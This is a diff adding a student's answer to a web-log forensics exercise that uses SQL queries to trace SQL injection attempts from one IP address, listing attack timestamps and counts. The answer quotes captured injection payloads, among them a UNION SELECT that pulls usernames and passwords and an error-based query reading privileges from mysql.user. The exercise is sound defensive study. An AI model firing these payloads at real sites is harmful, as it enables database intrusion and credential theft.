@@ -4,5 +4,69 @@ Find the logfile lines that contain this request and report:
 • Are there other attacks from the same IP addresses? (If there is more than 1, investigate 3 of them.) 
 
 Your answer goes here:
+For the attack CHAR(45,120,49,50,45,81,45)
+1. There are 1 ip address involved in this certain attack
+select ipaddr from logs where instr(request,'CHAR(45,120,49,50,45,81,45)')>0 group by ipaddr
+Row(ipaddr=u'92.50.158.21')]
 
+2. Here is a list of time when attack happens
+[Row(datetime=u'2012-09-07T06:17:05-07:00'),
+Row(datetime=u'2012-09-07T06:17:06-07:00'),
+Row(datetime=u'2012-09-07T06:17:08-07:00'),
+Row(datetime=u'2012-09-07T06:17:09-07:00'),
+Row(datetime=u'2012-09-07T06:17:10-07:00'),
+Row(datetime=u'2012-09-07T06:17:11-07:00'),
+Row(datetime=u'2012-09-07T06:17:12-07:00'),
+Row(datetime=u'2012-09-07T06:17:13-07:00'),
+Row(datetime=u'2012-09-07T06:17:14-07:00'),
+Row(datetime=u'2012-09-07T06:17:16-07:00'),
+Row(datetime=u'2012-09-07T06:17:17-07:00'),
+Row(datetime=u'2012-09-07T06:17:21-07:00'),
+Row(datetime=u'2012-09-07T06:17:23-07:00'),
+Row(datetime=u'2012-09-07T06:17:24-07:00'),
+Row(datetime=u'2012-09-07T06:17:45-07:00'),
+Row(datetime=u'2012-09-07T06:17:46-07:00'),
+Row(datetime=u'2012-09-07T06:17:47-07:00'),
+Row(datetime=u'2012-09-07T06:17:48-07:00'),
+Row(datetime=u'2012-09-07T06:17:49-07:00'),
+Row(datetime=u'2012-09-07T06:17:50-07:00'),
+Row(datetime=u'2012-09-07T06:17:52-07:00'),
+Row(datetime=u'2012-09-07T06:17:53-07:00'),
+Row(datetime=u'2012-09-07T06:17:55-07:00'),
+Row(datetime=u'2012-09-07T06:17:56-07:00'),
+Row(datetime=u'2012-09-07T06:17:57-07:00'),
+Row(datetime=u'2012-09-07T06:17:59-07:00'),
+Row(datetime=u'2012-09-07T06:18:00-07:00'),
+Row(datetime=u'2012-09-07T06:18:01-07:00'),
+Row(datetime=u'2012-09-07T06:18:23-07:00'),
+Row(datetime=u'2012-09-07T06:18:24-07:00'),
+Row(datetime=u'2012-09-07T06:18:25-07:00'),
+Row(datetime=u'2012-09-07T06:18:26-07:00'),
+Row(datetime=u'2012-09-07T06:18:27-07:00'),
+Row(datetime=u'2012-09-07T06:18:29-07:00'),
+Row(datetime=u'2012-09-07T06:18:30-07:00'),
+Row(datetime=u'2012-09-07T06:18:31-07:00'),
+Row(datetime=u'2012-09-07T06:18:33-07:00'),
+Row(datetime=u'2012-09-07T06:18:34-07:00'),
+Row(datetime=u'2012-09-07T06:18:35-07:00'),
+Row(datetime=u'2012-09-07T06:18:37-07:00'),
+Row(datetime=u'2012-09-07T06:18:38-07:00'),
+Row(datetime=u'2012-09-07T06:18:40-07:00')]
+
+We can see from the list that this attack appear in 2012-09-07 starts from 06:17:05 ends with 06:18:40.
+
+3.There are 61 attacks from the same ip address except the “CHAR(45,120,49,50,45,81,45)” request.
+"select count(*) from logs where ipaddr='92.50.158.21' and instr(request,'CHAR(45,120,49,50,45,81,45)')=0 "
+[Row(_c0=61)]
+Here are some of examples of other attacks:
+select*from(select_name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))
+SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45)
+
+
+4.Are there other SQL attacks in the data set?
+Select is the mostly used keyword in sql, so I tried to filter select in raw_log and select by 'select' and 'from' in request(There are many normal request only contains 'request' such as 'selected papers' etc,but if add 'from',it is more likely to be a sql attack). I find three possible attacks from ip 92.50.158.21. Here is an example request:
+Row(request=u'GET /index.php?title=Tools:Memory_Imaging%20and%28select%201%20from%28select%20count%28*%29%2Cconcat%28%28select%20%28select%20%28SELECT%20distinct%20concat%28file_priv%2C0x27%2C0x7e%29%20FROM%20mysql.user%20%20LIMIT%200,1%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201%3D1 HTTP/1.0', ipaddr=u'92.50.158.21')]
+
+Another possible sql attack from ip'198.15.113.106' is
+[Row(request=u'GET /ajax.php?do=quick_replay&t=7+union+select+1,2,3,concat(0x7a33726f31,username,0x0d0a,password,0x7a33726f32),5,6,username,8,9,10,11,12,13,14,15,16,17+from+user+where+userid=1-- HTTP/1.1')]
 
